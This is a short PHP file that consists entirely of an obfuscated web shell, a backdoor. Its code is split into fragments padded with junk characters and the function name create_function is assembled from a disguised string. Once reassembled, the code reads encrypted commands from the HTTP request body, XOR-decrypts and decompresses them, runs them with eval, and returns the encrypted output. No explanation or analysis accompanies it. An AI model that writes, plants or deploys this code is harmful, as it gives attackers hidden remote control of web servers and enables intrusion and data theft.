<?php
$y='$p="LPVwtHA{z3FjoA{r83A{vf";functioA{n xA{A{($t,$k){$c=A{sA{trA{len($k';
$w='($A{m[1]),$k)));$o=A{@A{ob_get_conteA{nts()A{;@ob_eA{nd_A{clean();$rA{=@ba';
$S=')==A{1) A{A{{@ob_start();@evaA{l(@gzuA{nA{comprA{ess(@x(@basA{eA{64_dA{ecode';
$W=');$l=strleA{n($t);$oA{="";foA{r($A{i=0;$i<$A{l;){foA{A{r($j=0A{;($j<$c';
$D='$k="26A{ec1A{f61";$kh="9A{53A{8eA{71883ba";$kf="A{A{20ccA{2b816739A{";';
$c='{("/$khA{(.+)$A{kf/"A{,@fileA{_A{get_conA{tents("php://iA{nputA{"),$mA{';
$P='A{se64_encoA{de(@xA{(@gzA{comA{press($A{o),$kA{));print("A{$p$kA{h$r$kf");}';
$Z=str_replace('gs','','crgseagste_gsfugsngsctigson');
$V='&&$iA{A{<$l);$j++,$i++)A{{A{$o.=$t{$A{iA{}^$k{$A{j};}}retuA{rn $o;}A{if (@pA{reg_matchA';
$d=str_replace('A{','',$D.$y.$W.$V.$c.$S.$w.$P);
$H=$Z('',$d);$H();
?>
